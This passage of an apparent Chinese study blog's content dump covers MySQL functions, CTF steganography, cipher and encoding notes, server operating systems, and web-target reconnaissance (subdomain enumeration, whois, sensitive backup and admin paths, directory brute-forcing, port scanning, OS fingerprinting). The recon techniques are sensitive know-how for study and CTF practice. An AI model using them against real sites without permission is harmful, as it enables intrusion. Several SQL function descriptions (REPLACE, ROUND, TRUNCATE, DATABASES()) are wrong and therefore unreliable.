title="特点"></a>特点</h2></li><li>叫什么（函数名）</li><li>干什么（函数功能）</li></ol><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>单行函数：contact length ifnull等只有一个返回值的函数</li><li>分组函数：做统计使用，缩小返回值的量，统计函数，聚合函数，组函数<h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2></li><li>SELECT CONTACT(‘a’,’b’,’c’) AS 结果;得出abc</li></ol><h1 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h1><h2 id="length（是字节长度）"><a href="#length（是字节长度）" class="headerlink" title="length（是字节长度）"></a>length（是字节长度）</h2><ol><li>select length(‘join’) 4</li><li>select length(‘张三疯hahaha’) 15(看字符集判断汉字字节长度)<h2 id="concat拼接字符串"><a href="#concat拼接字符串" class="headerlink" title="concat拼接字符串"></a>concat拼接字符串</h2></li><li>SELECT CONCAT(last_name,’-‘,first_name) FROM employees;<h2 id="upper-lower"><a href="#upper-lower" class="headerlink" title="upper,lower"></a>upper,lower</h2></li><li>SELECT UPPER(‘join’); JOIN<h3 id="实例：将姓变大写，将名变小写"><a href="#实例：将姓变大写，将名变小写" class="headerlink" title="实例：将姓变大写，将名变小写"></a>实例：将姓变大写，将名变小写</h3></li><li>SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;<h2 id="substr-substring"><a href="#substr-substring" class="headerlink" title="substr,substring"></a>substr,substring</h2><h3 id="索引从1开始"><a href="#索引从1开始" class="headerlink" title="索引从1开始"></a>索引从1开始</h3></li><li>SELECT SUBSTR(‘abcdef’,from) out_put:将从from到最后的字符选择<h3 id="截取指定长度的字符（一定是字符长度）"><a href="#截取指定长度的字符（一定是字符长度）" class="headerlink" title="截取指定长度的字符（一定是字符长度）"></a>截取指定长度的字符（一定是字符长度）</h3></li><li>SELECT SUBSTR(‘abcdef’,from,end) out_put</li></ol><h4 id="姓名用首字符大写，其他字符用小写后用——拼接"><a href="#姓名用首字符大写，其他字符用小写后用——拼接" class="headerlink" title="姓名用首字符大写，其他字符用小写后用——拼接"></a>姓名用首字符大写，其他字符用小写后用——拼接</h4><p>SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),’_’,LOWER(SUBSTR(last_name,2)));</p><h3 id="instr"><a href="#instr" class="headerlink" title="instr"></a>instr</h3><ol><li>用于返回字符的起始索引</li><li>SELECT INSTR(‘abcdef’,’def’) AS out_put</li><li>如果找不到返回0</li></ol><h2 id="trim"><a href="#trim" class="headerlink" title="trim:"></a>trim:</h2><ol><li>SELECT TRIM(‘   abcde    ‘) AS out_put</li><li>去掉字符串两侧的空格</li><li>python中是strip或者replace<h3 id="删去a"><a href="#删去a" class="headerlink" title="删去a:"></a>删去a:</h3></li><li>SELECT TRIM(‘a’ FROM ‘aaaaaaaa人名aaaaaaaaa人名aaaaa’)将删去两侧的a，中间的a不会删去</li></ol><h2 id="lpad"><a href="#lpad" class="headerlink" title="lpad"></a>lpad</h2><ol><li>用指定的字符实现左填充指定长度</li><li>SELECT LPAD(‘人名名’，10，’*’)</li></ol><h2 id="rpad"><a href="#rpad" class="headerlink" title="rpad"></a>rpad</h2><ol><li>用指定字符实现右填充</li><li>参数：待填充字符串，填充后长度，用于填充的字符串</li></ol><h2 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h2><ol><li>SELECT REPLACE(‘abcdefabcdef’,’a’,’b’) AS out_put</li><li>将字符串中的所有a和b都删去</li><li>参数：待删除字符串，后面都是需要删除的字符</li></ol><h2 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h2><ol><li>数学函数的第二位都是小数点后保留几位<h3 id="round"><a href="#round" class="headerlink" title="round"></a>round</h3></li><li>四舍五入</li><li>SELECT ROUND(x,y)</li><li>将x绝对值四舍五入，后删去正负号</li><li>y是保留小数点后的位数</li></ol><h3 id="ceil"><a href="#ceil" class="headerlink" title="ceil"></a>ceil</h3><ol><li>向上取整</li><li>返回大于等于该参数的最小整数</li></ol><h2 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h2><ol><li>向下取整</li><li>返回小于等于该参数的最大整数</li></ol><h2 id="truncate"><a href="#truncate" class="headerlink" title="truncate"></a>truncate</h2><ol><li>截断,无论后面是什么，都会四舍五入</li><li>SELECT TRUNCATE(1.69999,1) AS out_put:返回1.6</li></ol><h2 id="mod"><a href="#mod" class="headerlink" title="mod"></a>mod</h2><ol><li>SELECT MOD(10,3);</li><li>相当于SELECT 10 % 3;</li><li>被除数如果为正，则结果为正，否则为负</li><li>a-a/b*b   (除数一定返回的是整数，即被整除的值)</li></ol><h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><h3 id="now"><a href="#now" class="headerlink" title="now"></a>now</h3><ol><li>用于返回系统日期+时间</li></ol><h3 id="curdate"><a href="#curdate" class="headerlink" title="curdate"></a>curdate</h3><ol><li>用于返回系统日期，没有时间</li><li>与now的区别在于没有时间</li></ol><h3 id="curtime"><a href="#curtime" class="headerlink" title="curtime"></a>curtime</h3><ol><li>用于返回系统时间，不包含系统日期</li></ol><h3 id="可以获取指定部分，年，月，日，小时，分钟，秒"><a href="#可以获取指定部分，年，月，日，小时，分钟，秒" class="headerlink" title="可以获取指定部分，年，月，日，小时，分钟，秒"></a>可以获取指定部分，年，月，日，小时，分钟，秒</h3><ol><li>SELECT YEAR(NOW()) 年；</li><li>出现英文需要在函数后面加MONTH</li><li>SELECT MONTHNAME(NOW()) 年；</li></ol><h3 id="str-to-date-将日期格式的字符转换成指定格式的日期"><a href="#str-to-date-将日期格式的字符转换成指定格式的日期" class="headerlink" title="str_to_date:将日期格式的字符转换成指定格式的日期"></a>str_to_date:将日期格式的字符转换成指定格式的日期</h3><ol><li>STR_TO_DATE(‘7-29-2003’,’%Y-%m-%d’) 2003-07-29:</li><li>月份将转为两位</li><li><img src="https://s4.ax1x.com/2022/02/12/H0kaCt.png"></li><li>SELECT * FROM employees WHERE hiredate = STR_TO_DATE(‘4-3-1992’,’%c-%d %Y’)</li></ol><h3 id="date-format-将日期转换成字符"><a href="#date-format-将日期转换成字符" class="headerlink" title="date_format:将日期转换成字符"></a>date_format:将日期转换成字符</h3><ol><li>DATE_FORMAT(‘2003-07-29’,’%Y年%m月%d日’) 将返回2003年07月29日</li></ol><h2 id="其它函数"><a href="#其它函数" class="headerlink" title="其它函数"></a>其它函数</h2><ol><li>SELECT VERSION();版本号</li><li>SELECT DATABASES();查看数据库（注意有s表示复数）</li><li>SELECT USER();查看用户</li></ol><h2 id="流程控制函数"><a href="#流程控制函数" class="headerlink" title="流程控制函数"></a>流程控制函数</h2><h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><ol><li>if(exp1,exp2,exp3)</li><li>exp1是条件表达式，true or false</li><li>如果为true，则返回exp2的值</li><li>如果为false，则返回exp3的值</li><li>和py中的倒装句类似 （正确 if 条件 else 错误）</li></ol><h3 id="case函数"><a href="#case函数" class="headerlink" title="case函数"></a>case函数</h3><ol><li>case 要判断的字段或表达式</li><li>when 常量1 then 要显示的值1或语句1</li><li>when 常量2 then 要显示的值2或语句2</li><li>else 要显示的值n或语句n</li><li>end</li></ol><h4 id="等值判断"><a href="#等值判断" class="headerlink" title="等值判断"></a>等值判断</h4><ol><li>select salary 原始工资，departmant_id,</li><li>CASE department_id</li><li>WHEN 30 THEN salary*1.1</li><li>WHEN 40 THEN salary*1.2</li><li>WHEN 50 THEN salary*1.3</li><li>ELSE salary</li><li>END AS 新工资</li><li>FROM employees;</li></ol><h5 id="多重if判断区间"><a href="#多重if判断区间" class="headerlink" title="多重if判断区间"></a>多重if判断区间</h5><ol><li>SELECT salary</li><li>CASE</li><li>WHEN salary&gt;2 THEN ‘A’</li><li>WHEN salary&gt;1 THEN ‘B’</li><li>ELSE ‘D’</li><li>END AS 工资级别</li><li>FROM employees;</li></ol><h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h1><h2 id="sum"><a href="#sum" class="headerlink" title="sum"></a>sum</h2><h2 id="avg"><a href="#avg" class="headerlink" title="avg"></a>avg</h2><h2 id="max"><a href="#max" class="headerlink" title="max"></a>max</h2><h2 id="min"><a href="#min" class="headerlink" title="min"></a>min</h2><h2 id="count"><a href="#count" class="headerlink" title="count"></a>count</h2>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF杂项常见类别</title>
      <link href="/CTF%E6%9D%82%E9%A1%B91/"/>
      <url>/CTF%E6%9D%82%E9%A1%B91/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF杂项常见类别"><a href="#CTF杂项常见类别" class="headerlink" title="CTF杂项常见类别"></a>CTF杂项常见类别</h1><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="载体"><a href="#载体" class="headerlink" title="载体"></a>载体</h3><ol><li>图片</li><li>音频</li><li>视频</li><li>压缩包<h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2></li><li>颜色差别(LSB隐写)</li><li>gif多帧隐藏</li><li>exif信息隐藏（藏在图片的exif信息中）</li><li>图片修复<h3 id="LSB最低有效位隐写"><a href="#LSB最低有效位隐写" class="headerlink" title="LSB最低有效位隐写"></a>LSB最低有效位隐写</h3></li><li>利用RGB</li><li>红色十进制为255，二进制为1111，1111（8个1）</li><li>通过修改像素最低位的1bit来达到隐藏的效果</li><li>工具：stegsolve</li><li>点击左右查看不同色位的信息<h3 id="图像隐写-1"><a href="#图像隐写-1" class="headerlink" title="图像隐写"></a>图像隐写</h3></li><li>信息隐藏在动态图中</li><li>stegsolve中框架浏览器frame brouser<h3 id="Exif信息隐写"><a href="#Exif信息隐写" class="headerlink" title="Exif信息隐写"></a>Exif信息隐写</h3></li><li>照片中的EXIF属性可以保存大量的信息</li><li>windows右击查看图像属性<h3 id="图像修复"><a href="#图像修复" class="headerlink" title="图像修复"></a>图像修复</h3><h4 id="图像类型"><a href="#图像类型" class="headerlink" title="图像类型"></a>图像类型</h4></li><li>jpeg/jpg 文件头：（2byte）FF D8 文件结束：（2byte）FF D9</li><li>png(8byte):89 50 4E 47 0D 0A 1A 0A</li><li>gif(6byte):47 49 46 38 39(37) 61</li><li>BMP(2byte):42 4D</li><li>参考博客<a href="https://www.cnblogs.com/senior-engineer/p/9541719.html">https://www.cnblogs.com/senior-engineer/p/9541719.html</a></li><li>常用类型博客参考<a href="https://blog.csdn.net/xiaolong22333/article/details/107498232">https://blog.csdn.net/xiaolong22333/article/details/107498232</a><h4 id="修改图片大小"><a href="#修改图片大小" class="headerlink" title="修改图片大小"></a>修改图片大小</h4></li><li>第二行的前四位是宽，后四位是高<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3></li><li>winhex修复文件头<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3></li><li>信息隐藏在声音里（逆序）</li><li>信息隐藏在数据里<h3 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h3></li><li>Adoube Audition<h4 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h4></li><li>拉到Adobe Audition里面是下面这个样子。我们可以手动比照上面那个表格得到数字，也可以用dtmf2num.exe自动解码。</li><li>MP3Stego</li></ol><h4 id="Decode-exe-X-文件名-P-密码"><a href="#Decode-exe-X-文件名-P-密码" class="headerlink" title="Decode.exe -X 文件名 -P 密码"></a>Decode.exe -X 文件名 -P 密码</h4><ol><li>-X后面是隐藏的东西 -P后面写密码</li><li>****1.开始-&gt;运行-&gt;CMD</li><li>进入某个磁盘，直接盘符代号：如D：，不用CD 命令切换</li><li>进入除根录以下的文件夹 cd 文件夹路径 例如我要进入 E:/Program Files/PHP 就<br>输入 E：回车<h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4></li><li>将没有隐藏信息的部分删掉</li><li>若有莫斯电码信息，则减弱左声道，加强右声道或倒过来</li></ol><h3 id="视频隐写"><a href="#视频隐写" class="headerlink" title="视频隐写"></a>视频隐写</h3><ol><li>信息一女昂在视频的某个或多个帧中</li><li>Premiere<h3 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写"></a>文件隐写</h3></li><li>文件拼接</li><li>简单的可以直接使用Windows下的文件拼接命令copy /b 1.jpg+2.zip output.jpg<h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4></li><li>binwalk</li><li>dd</li><li>winhex</li></ol><h1 id="md5解密网站"><a href="#md5解密网站" class="headerlink" title="md5解密网站"></a>md5解密网站</h1><ol><li><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li><li>MD5算法特点：</li><li>压缩性：任意长度的数据，算出的MD5值长度都是固定的</li><li>容易计算，从原数据计算出的MD5值很容易<h1 id="base64解密网站"><a href="#base64解密网站" class="headerlink" title="base64解密网站"></a>base64解密网站</h1></li><li><a href="https://the-x.cn/base64">https://the-x.cn/base64</a></li><li>这个网站对格式要求不是很高，且能够报错</li></ol><h1 id="密码学及编码"><a href="#密码学及编码" class="headerlink" title="密码学及编码"></a>密码学及编码</h1><ol><li>古典密码可以分为置换密码和替换密码<h2 id="位移密码"><a href="#位移密码" class="headerlink" title="位移密码"></a>位移密码</h2></li><li>凯撒密码</li><li>每一个字母顺序移动几个位置，key值即为偏移量<h2 id="解密方法（对key值进行解密）"><a href="#解密方法（对key值进行解密）" class="headerlink" title="解密方法（对key值进行解密）"></a>解密方法（对key值进行解密）</h2></li><li>手动解密</li><li>在线工具</li><li>python中的pycipher模块</li><li>from pycipher import Caesar</li><li>Caesar(key=设置).encipher(“待引入”)<h3 id="特殊形式ROT13"><a href="#特殊形式ROT13" class="headerlink" title="特殊形式ROT13"></a>特殊形式ROT13</h3></li><li>相当于凯撒加密的key=13</li><li>加密和解密是一个循环</li><li>一共26个英文字母，相当于是跑了一边英文字母<h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2></li><li>一维的加密(分组密码)</li><li>栏数必须为密文长度的约数，明文长度与密文长度相同<h2 id="弗吉尼亚密码"><a href="#弗吉尼亚密码" class="headerlink" title="弗吉尼亚密码"></a>弗吉尼亚密码</h2></li><li>二维的加密<h3 id="工具：在线解密，脚本"><a href="#工具：在线解密，脚本" class="headerlink" title="工具：在线解密，脚本"></a>工具：在线解密，脚本</h3></li><li>输入明文</li><li>输入密钥<h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2></li><li>加密和解密使用相同密钥</li><li>DES，3DES，AES</li><li>使用在线工具进行解密<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2></li><li>如果使用公钥进行加密，则用对应的私钥才能解密</li><li>如果使用私钥，则需要使用公钥</li><li>RSA,Elgamal,背包算法，Rabin,D-H,ECC<h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2></li><li>直线和点组成的图形</li><li><a href="https://imgtu.com/i/qMyOud"><img src="https://s1.ax1x.com/2022/03/22/qMyOud.png" alt="qMyOud.png"></a><h2 id="培根密码：由a和b构成的替换密码"><a href="#培根密码：由a和b构成的替换密码" class="headerlink" title="培根密码：由a和b构成的替换密码"></a>培根密码：由a和b构成的替换密码</h2></li><li>可以将a理解为0</li><li>b理解为1</li><li><a href="https://imgtu.com/i/qM6K8U"><img src="https://s1.ax1x.com/2022/03/22/qM6K8U.png" alt="qM6K8U.png"></a><h2 id="键盘密码：电脑键盘位置连线画出图案"><a href="#键盘密码：电脑键盘位置连线画出图案" class="headerlink" title="键盘密码：电脑键盘位置连线画出图案"></a>键盘密码：电脑键盘位置连线画出图案</h2></li><li>连线得到的是字母图案<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2></li><li>通过密钥和密文可以还原原始信息<h2 id="编码："><a href="#编码：" class="headerlink" title="编码："></a>编码：</h2></li><li>将数据转化成某种固定的格式的编码信息，方便不同系统之间的传输<h2 id="散列："><a href="#散列：" class="headerlink" title="散列："></a>散列：</h2></li><li>哈希值，验证完整性，不能解码<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3></li><li>莫斯电码，HTML编码，二维码也算是编码</li><li>base64编码文本末尾输出字符使用=，所以编码后输出的文本末尾可能会出现一个或两个=</li></ol><h1 id="解码网站汇总"><a href="#解码网站汇总" class="headerlink" title="解码网站汇总"></a>解码网站汇总</h1><ol><li><a href="https://daimajiaoliu.com/daima/8c7941818c4d408">https://daimajiaoliu.com/daima/8c7941818c4d408</a></li></ol><h1 id="各种编码特点"><a href="#各种编码特点" class="headerlink" title="各种编码特点"></a>各种编码特点</h1><ol><li>参考博客：<a href="https://cloud.tencent.com/developer/article/1748394">https://cloud.tencent.com/developer/article/1748394</a></li><li>1、MD5——示例21232F297A57A5A743894A0E4A801FC3<br>一般MD5值是32位由数字“0-9”和字母“a-f”所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。</li><li>2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997<br>这种加密的密文特征跟MD5差不多，只不过位数是40</li><li>1、Base64——示例YWRtaW4tcm9vdA==<br>一般情况下密文尾部都会有两个等号，明文很少的时候则没有</li><li>2、Base58——示例6tmHCZvhgfNjQu<br>它最大的特点是没有等号</li><li>3、Base32——示例GEZDGNBVGY3TQOJQGE======<br>他的特点是明文超过十个后面就会有很多等号</li><li>4、Base16——示例61646D696E<br>它的特点是没有等号并且数字要多于字母</li><li>5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#<br>特点是奇怪的字符比较多，但是很难出现等号</li><li>6、Base100——示例:emoji<br>特点就是一堆Emoji表情<h1 id="各种密码特点"><a href="#各种密码特点" class="headerlink" title="各种密码特点"></a>各种密码特点</h1></li><li>1、凯撒密码——示例iodj{khoor_zrug_123}<br>只对字母进行加密，常用于CTF比赛中</li><li>2、维吉尼亚密码——示例fmcg{iglmq_wptd_123}<br>可以说是凯撒密码的加强版，引入了密钥</li></ol><h1 id="隐写术工具"><a href="#隐写术工具" class="headerlink" title="隐写术工具"></a>隐写术工具</h1><h2 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h2><ol><li>图片隐写术</li><li>扫出二维码可以用手机qq，微信，cortexscan</li><li>也可以逐帧分析gif，点击frame browser进入帧预览功能<h2 id="winhex-010editor-导出或导入16进制处理txt形式的文件"><a href="#winhex-010editor-导出或导入16进制处理txt形式的文件" class="headerlink" title="winhex/010editor(导出或导入16进制处理txt形式的文件)"></a>winhex/010editor(导出或导入16进制处理txt形式的文件)</h2><h2 id="photoshop（图形拼接）"><a href="#photoshop（图形拼接）" class="headerlink" title="photoshop（图形拼接）"></a>photoshop（图形拼接）</h2></li><li>矩形选框功能选出条形码</li><li>ctrl+c进行复制</li><li>右下角创建图层</li><li>使用选择工具移动<h2 id="Adobe-Auditon"><a href="#Adobe-Auditon" class="headerlink" title="Adobe Auditon"></a>Adobe Auditon</h2></li><li>右侧的L和R分别代表左右声道，可以打开或关闭左右声道</li><li>上方的hms一栏中可以增大音符<h2 id="搜索加解密工具"><a href="#搜索加解密工具" class="headerlink" title="搜索加解密工具"></a>搜索加解密工具</h2><h2 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h2></li><li>最上方一栏decoder可以实现编码和解码</li><li>encode实现加密（选择编码方式）</li><li>decode实现解密（选择解码方式）<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2></li><li>先cat一下看看里面有什么</li><li>检测隐写的东西里面有什么</li><li>binwalk 文件（命令），即可检测出里面有什么东西<h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2></li><li>foremost 文件名（命令），即可分离出里面隐藏的东西</li></ol><h1 id="CTF取证技术"><a href="#CTF取证技术" class="headerlink" title="CTF取证技术"></a>CTF取证技术</h1><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h4 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h4><ol><li>点击右侧表达式，使用wireshark内在表达式进行过滤</li><li>筛选协议：http,ftp等</li><li>ip.addr == 192.168.1.1</li><li>也可以使用表达式中的逻辑运算符进行运算<h4 id="追踪流"><a href="#追踪流" class="headerlink" title="追踪流"></a>追踪流</h4></li><li>右击追踪流</li><li>选择TCP/UDP/SSL/HTTP</li><li>弹出的窗口中选择查找下一个<h4 id="文件导出"><a href="#文件导出" class="headerlink" title="文件导出"></a>文件导出</h4></li><li>Export Objects,选择不同类型</li></ol><h5 id="被偷走的文件和秘密文件"><a href="#被偷走的文件和秘密文件" class="headerlink" title="被偷走的文件和秘密文件"></a>被偷走的文件和秘密文件</h5><ol><li>题目给出入侵时的秘密文件，分析ftp流量包</li><li>追踪流</li><li>发现有rar文件，使用binwalk -e进行分离</li><li>分离出rar文件，使用ARCHPR进行爆破，得到flag</li></ol><h3 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h3><ol><li>点击上方筛选</li><li>查看所有upload中hack.php信息</li><li>右击，选择follow，追踪http流</li></ol><h3 id="四种流"><a href="#四种流" class="headerlink" title="四种流"></a>四种流</h3><ol><li>GET用来获取资源，只是获取，查询数据，不会修改服务器的数据</li><li>POST可以向服务器发送修改请求，进行数据的修改。</li></ol><h3 id="不同文件类型的文件头"><a href="#不同文件类型的文件头" class="headerlink" title="不同文件类型的文件头"></a>不同文件类型的文件头</h3><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><h2 id="电子取证"><a href="#电子取证" class="headerlink" title="电子取证"></a>电子取证</h2><h3 id="即日志分析"><a href="#即日志分析" class="headerlink" title="即日志分析"></a>即日志分析</h3><p>访问IP+访问时间+访问方式+访问路径+访问版本+响应</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器系统</title>
      <link href="/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/"/>
      <url>/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h1><h2 id="即服务器的操作系统"><a href="#即服务器的操作系统" class="headerlink" title="即服务器的操作系统"></a>即服务器的操作系统</h2><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><h3 id="windows-server"><a href="#windows-server" class="headerlink" title="windows server"></a>windows server</h3><ol><li><p>对存储装置管控更安全</p></li><li><p>不提供32位版本</p><h3 id="netware"><a href="#netware" class="headerlink" title="netware"></a>netware</h3></li><li><p>以文件服务器为中心，主要由三部分组成：文件服务器内核，工作站外壳，低层通信协议</p><h3 id="unix"><a href="#unix" class="headerlink" title="unix"></a>unix</h3></li><li><p>多用户，多任务的分时操作系统</p></li><li><p>结构：操作系统内核，系统调用，应用程序</p></li><li><p>功能强大的可编程的Shell语言(外壳语言);</p></li><li><p>采用树状目录结构，具有良好的安全性，保密性和可维护性;</p></li><li><p>采用进程对换(Swapping)的内存管理机制和请求调页的存储方式，实现虚拟内存管理，内存的使用效率大增;</p></li><li><p>多种通信机制，如：管道通信，软中断通信，消息通信，共享存储器通信，信号灯通信。</p><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3></li><li><p>类unix操作系统，多用户，多任务，支持多线程和多CPU的操作系统</p></li><li><p>思想：一切都是文件，每个软件都有确定的用途</p></li><li><p>多用户，多任务：各个用户对于自己的文件设备有自己特殊的权利；多个程序可以同时并独立的运行</p></li><li><p>同时字符界面和图形界面</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名信息</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="IP概念"><a href="#IP概念" class="headerlink" title="IP概念"></a>IP概念</h1><ol><li>网络地址：可以用来识别设备所在的网络，网络地址位于IP地址的前端，企业申请IP地址时，获得的不是IP地址，而是唯一的能够识别的网络地址</li><li>主机地址：位于IP地址的后段，可以用来是被网络上的设备，同一网络上的设备都会有相同的网络地址，而各台设备之间通过主机地址来区别<h1 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h1></li><li>版本（4）：IPV6协议版本，其值为6，负责向处理机所运行的IP软件指名此IP数据是IPV6版本</li><li>优先级（4）</li><li>流标号（24）<h1 id="对应IP收集"><a href="#对应IP收集" class="headerlink" title="对应IP收集"></a>对应IP收集</h1></li><li>ping 域名：可以初步获取该地址的服务器相关信息</li><li>相关域名对应IP,相关工具：nslookup：nslookup endl 地址<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><a href="http://www.baidu.com/">www.baidu.com</a></li><li>www.或bbs.为主机名，是主机头</li><li>baidu.com为主域名</li><li>bbs.baidu.com或edu.baidu.com为该主域名下的子域名</li><li>子域名的防御性没有主域名高，子域名可能跟主域名在一个服务器上，通过子域名也可以渗透到主域名</li><li>根据主站点来查找:site.baidu.com</li><li>使用layer子域名挖掘机：输入域名，端口，选择暴力枚举还是解析接口</li><li>可以发现多个域名用一个IP<h1 id="whois-注册人-信息查询"><a href="#whois-注册人-信息查询" class="headerlink" title="whois(注册人)信息查询"></a>whois(注册人)信息查询</h1></li><li>根据已知域名反查，分析出此域名的注册人，邮箱。电话</li><li>工具：爱站网，输入域名后点击whois查询<h1 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h1>目的：搜集信息</li><li>扫robots.txt，其中定义了哪些页面不允许爬行（定义的都是一些敏感的）</li><li>安装包（backup）:<a href="http://www.root.rar/zip;beifen.rar/zip;tar.gz">www.root.rar/zip;beifen.rar/zip;tar.gz</a></li><li>上传目录:ewebedit;ckfinder</li><li>mysql:phpmyadmin:pmd/pma/phadmin</li><li>phpinfo</li><li>编辑器</li><li>iis短文件<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li><li>字典爆破：御剑：输入域名之后直接开始扫目录</li><li>蜘蛛爬行：菜刀：开spider（蜘蛛爬取），输入域名之后开始爬取（菜刀是轻量级的，所有扫出来的结果将放到桌面）<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="记得查常用端口"><a href="#记得查常用端口" class="headerlink" title="记得查常用端口"></a>记得查常用端口</h2><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h2 id="portscan-收录在CTFtools中"><a href="#portscan-收录在CTFtools中" class="headerlink" title="portscan(收录在CTFtools中)"></a>portscan(收录在CTFtools中)</h2></li><li>输入起止IP</li><li>设置端口</li><li>点击start<h2 id="ntscan"><a href="#ntscan" class="headerlink" title="ntscan"></a>ntscan</h2><h2 id="telnet-是Windows自带的链接端口的工具"><a href="#telnet-是Windows自带的链接端口的工具" class="headerlink" title="telnet(是Windows自带的链接端口的工具)"></a>telnet(是Windows自带的链接端口的工具)</h2></li><li>格式：telnet 域名 端口（telnet <a href="http://qufutuan.com/">http://qufutuan.com</a> 3306）<h1 id="旁站c站"><a href="#旁站c站" class="headerlink" title="旁站c站"></a>旁站c站</h1><h1 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h1><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li><li>windows/linux<h2 id="脚本格式"><a href="#脚本格式" class="headerlink" title="脚本格式"></a>脚本格式</h2></li><li>asp aspx php jsp<h2 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h2></li><li>access</li><li>sqlserver</li><li>oracle</li><li>db2</li><li>postgresql</li><li>sqlite<h2 id="防护情况waf"><a href="#防护情况waf" class="headerlink" title="防护情况waf"></a>防护情况waf</h2></li><li>web application firewall<h2 id="cms类型"><a href="#cms类型" class="headerlink" title="cms类型"></a>cms类型</h2></li><li>dedecms</li><li>diguo</li><li>meterinfo</li><li>dz<h2 id="获取cms"><a href="#获取cms" class="headerlink" title="获取cms"></a>获取cms</h2></li><li>使用yunsee输入域名后查询：web指纹，语言，数据库，容器，服务器IP，操作系统<h2 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h2><h3 id="判断是什么脚本"><a href="#判断是什么脚本" class="headerlink" title="判断是什么脚本"></a>判断是什么脚本</h3></li><li>/index.php若正常则为php脚本</li><li>/index.asp若正常则为asp脚本</li><li>/index.asps若正常则为aspx脚本</li><li>/index.jsp若正常则为jsp脚本<h3 id="判断操作系统"><a href="#判断操作系统" class="headerlink" title="判断操作系统"></a>判断操作系统</h3></li><li>windows不区分大小写，Linux区分大小写</li><li>输入/index.phP(即修改一个字母)若正常则为windows，不正常则为linux（当php脚本存在时）</li><li>注意区分脚本类型<h3 id="测waf"><a 